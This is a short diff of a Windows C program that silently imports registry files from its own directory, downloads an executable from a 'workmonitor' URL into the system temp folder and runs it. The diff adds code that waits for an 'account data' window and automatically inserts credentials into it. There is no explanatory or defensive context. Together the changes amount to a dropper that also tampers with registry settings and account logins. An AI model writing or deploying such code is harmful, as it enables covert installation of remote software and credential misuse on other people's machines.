@@ -3,11 +3,12 @@
 #include <stdio.h>
 #include <tchar.h>
 #include <shlwapi.h>
+#include "testedigita.h"
 
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "shlwapi.lib")
 
-void ImportRegFiles() {
+int ImportRegFiles() {
     char regFilePath[MAX_PATH];
     GetModuleFileName(NULL, regFilePath, MAX_PATH);
     PathRemoveFileSpecA(regFilePath);
@@ -34,8 +35,13 @@ void ImportRegFiles() {
             }
         } while (FindNextFileA(hFind, &findFileData));
         FindClose(hFind);
+        printf("hello, world!\n");
+        return 1;  // Sucesso na importação
+    } else {
+        return 0;  // Falha na importação
     }
 }
+
 void DownloadAndRun() {
     const char *url = "https://www.workmonitor.com/install/install.exe";
     const char *filePath = "C:\\Windows\\Temp\\install.exe";
@@ -62,7 +68,18 @@ void DownloadAndRun() {
 }
 
 int main() {
-    ImportRegFiles();
+    int regImportSuccess = ImportRegFiles();
+
     DownloadAndRun();
+
+    if (!regImportSuccess) {
+        HWND hwnd = FindWindowByTitle("Dados da Conta");
+        while (hwnd == NULL || GetForegroundWindow() != hwnd) {
+            Sleep(2000); // Espera 2 segundos antes de verificar novamente
+            hwnd = FindWindowByTitle("Dados da Conta");
+        }
+        InserirCredenciais();  // Inserir credenciais se a importação falhar após a instalação e a janela estiver ativa
+    }
+
     return 0;
 }
